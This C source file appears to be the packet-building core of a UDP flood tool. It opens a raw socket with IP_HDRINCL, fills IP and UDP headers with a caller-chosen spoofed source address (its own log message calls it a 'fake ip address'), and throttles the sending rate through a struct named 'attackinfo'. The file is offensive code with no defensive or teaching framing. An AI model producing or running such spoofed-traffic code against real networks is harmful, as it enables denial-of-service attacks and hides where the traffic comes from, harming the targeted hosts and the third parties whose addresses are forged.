#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/time.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

#include "common.h"

/*struct timeval *last must not modified in this func last time we finished sending the pkg*/
/*long int bwl bw - bytesend in last period*/
/*pkglen our fixed packet length*/
int chkrate(struct timeval *last,long int bwl,int pkglen){
        struct timeval now;
        //struct timespec slp;
        long tdiff;
        gettimeofday(&now,NULL);
        int tsdiff;
        tsdiff=now.tv_sec-last->tv_sec;
        tdiff=now.tv_usec-last->tv_usec;/*how many microseconds elapsed*/
        int elapes=tsdiff*1000000+tdiff;
        if(bwl>=pkglen){/*bytesend not bigger than bw limit*/
                if(elapes<999999)/*not spent 1 seconds*/
                        return 1;
                else{
                        printf("we got here\n");
                        return  gettimeofday(last,NULL);
                }
        }

        int sleeptm=1000000-elapes;
	if(verbose){
        	printf("bwl is %ld \n",bwl);
        	printf("I need to sleep for %d microseconds for %d times\n",sleeptm,sleptime);
        	printf("total sent %ld byte/secondss pkglen is %d\n",totalsend,pkglen);
        	printf("bwl is %ld \n",bwl);
        	printf("%d microseconds passed\n",elapes);
	}
        sleptime+=1;
        usleep(sleeptm);
	totalsend=0;
        return  gettimeofday(last,NULL);/*more than 1 seconds*/
}


/*udp header checksum*/
static uint16_t CalcChecksum(void *data, size_t len)  
{  
    uint16_t *p = (uint16_t *)data;  
    size_t left = len;  
    uint32_t sum = 0;  
    while (left > 1) {  
        sum += *p++;  
        left -= sizeof(uint16_t);  
    }  
    if (left == 1) {  
        sum += *(uint8_t *)p;  
    }  
    sum = (sum >> 16) + (sum & 0xFFFF);  
    sum += (sum >> 16);  
    return ~sum;  
}  

/* function for header checksums */
unsigned short csum (unsigned short *buf, int nwords)
{
	unsigned long sum;
	for (sum = 0; nwords > 0; nwords--)
	sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short)(~sum);
}

void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr);
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;
	//iph->saddr = inet_addr("127.0.0.1");/*wil be changed later */
}

void setup_udp_header(struct udphdr *udph)
{
	udph->source = htons(5678);
	udph->check = 0;
	//char *data = (char *)udph + sizeof(struct udphdr);
	/*
	unsigned int udplen=sizeof(udphdr);
	udph->len=htons(udplen);
*/
}

int setpkg(struct attackinfo *para){
	struct attackinfo *td=para;

	/*prepare for package*/
	/*package=iphdr+udphdr+payload*/
	char *buff=td->buff;
	
	/*point iph to buff[0]*/
	struct iphdr *iph = (struct iphdr *)buff;

	/*point udph to buff[sizeof(iphr)]*/
	struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

	//char new_ip[sizeof "255.255.255.255"];

	int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	if(s < 0){
    	fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}

	int tmp = 1;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}
	//unsigned int port = td->port;
	memset(buff+28,1,MAX_PACKET_SIZE-28);


	/*just setup the header not all detail*/
	setup_udp_header(udph);
	setup_ip_header(iph);

	/*setup udphddr detail*/
	udph->len=sizeof(struct udphdr)+td->pkglen;
	udph->dest=htons(td->port);
	udph->source=htons(5566);
	udph->check=CalcChecksum((unsigned short*)udph,udph->len);

	/*setup ip header detail*/
	iph->saddr=td->srcipaddr;	
	iph->daddr=td->dstipaddr;
	iph->tot_len=sizeof(struct iphdr)+sizeof(struct udphdr)+td->pkglen;
	iph->check=CalcChecksum((unsigned short*)buff,iph->tot_len>>1);
	if(verbose){
		struct in_addr srcaddr;
		srcaddr.s_addr=iph->saddr;
		char ipaddr[20];
		char *tt;
		tt=inet_ntoa(srcaddr);
		strcpy(ipaddr,tt);
		fprintf(stderr,"we send pkg using this fake ip address %s checksum is %d udpcheck is %d\n",ipaddr,iph->check,udph->check);
		
	}	
	return s;	
}
